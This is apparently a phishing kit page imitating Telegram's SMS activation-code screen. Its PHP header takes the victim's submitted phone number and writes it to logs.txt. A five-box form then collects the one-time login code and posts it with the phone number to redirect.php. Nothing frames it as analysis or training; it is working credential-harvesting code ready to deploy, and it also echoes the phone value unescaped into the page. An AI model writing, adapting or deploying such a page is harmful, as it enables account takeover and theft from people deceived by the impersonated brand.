<?php
// Capture phone number
$phone = $_POST['countryCode'] . $_POST['phoneNumber'];
file_put_contents('logs.txt', "Phone: $phone\n", FILE_APPEND);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Code</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="tg-container">
        <div class="tg-header">
            <h1>Telegram</h1>
            <p>We've sent an SMS with an activation code to your phone.</p>
        </div>
        
        <form action="redirect.php" method="POST" class="tg-form">
            <input type="hidden" name="phone" value="<?= $phone ?>">
            
            <div class="otp-inputs">
                <input type="text" name="otp1" maxlength="1" pattern="[0-9]" required>
                <input type="text" name="otp2" maxlength="1" pattern="[0-9]" required>
                <input type="text" name="otp3" maxlength="1" pattern="[0-9]" required>
                <input type="text" name="otp4" maxlength="1" pattern="[0-9]" required>
                <input type="text" name="otp5" maxlength="1" pattern="[0-9]" required>
            </div>
            
            <button type="submit" class="tg-button">VERIFY</button>
        </form>
    </div>
</body>
</html>
